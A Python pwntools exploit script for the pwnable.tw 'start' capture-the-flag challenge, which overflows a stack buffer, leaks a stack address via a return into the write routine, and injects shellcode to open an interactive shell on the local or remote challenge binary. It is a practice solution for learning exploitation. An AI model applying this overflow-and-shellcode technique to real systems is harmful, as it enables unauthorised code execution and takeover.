#!/usr/bin/env python3

from pwn import *

DWORD = 4

class Exploit:
    def __init__(self):
        self.elf = ELF('./given/start')

    def conn(self):
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10000)
        p = process(['./given/start'])
        if args.GDB:
            gdb.attach(p)
        return p

    def exploit(self):
        self.p = self.conn()

        # jump to the middle of operations to do SYS_WRITE
        # objective: leak stack address and show shell code.
        payload = b'a' * 0x14 + p32(0x804808b)
        self.p.sendafter(b"Let's start the CTF:", payload)


        self.p.recvn(len(payload))
        stack_addr_bin = self.p.recvn(DWORD)
        stack_addr = u32(stack_addr_bin) - 0x1c
        print(f"defering stack address: {hex(stack_addr)}")

        with open('shellcode/code.bin', 'rb') as f:
            shellcode = f.read()
            f.close()

        payload = shellcode.ljust(0x2c) + p32(stack_addr)
        self.p.sendline(payload)
        self.p.interactive()

if __name__ == '__main__':
    exploit = Exploit()
    exploit.exploit()
